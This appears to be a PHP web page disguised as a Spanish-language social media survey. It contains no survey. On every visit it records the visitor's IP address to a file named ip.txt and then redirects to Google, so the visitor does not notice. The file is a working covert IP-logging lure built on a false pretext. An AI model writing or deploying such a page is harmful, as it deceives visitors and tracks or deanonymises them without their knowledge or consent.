<html>
<head>
    <title> Encuesta sobre uso de redes sociales </title>
</head>
</html>
<?php
function getIP() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
$ip = getIP();
file_put_contents("ip.txt", $ip);
header("location: http://www.google.com.mx");
die();
?>
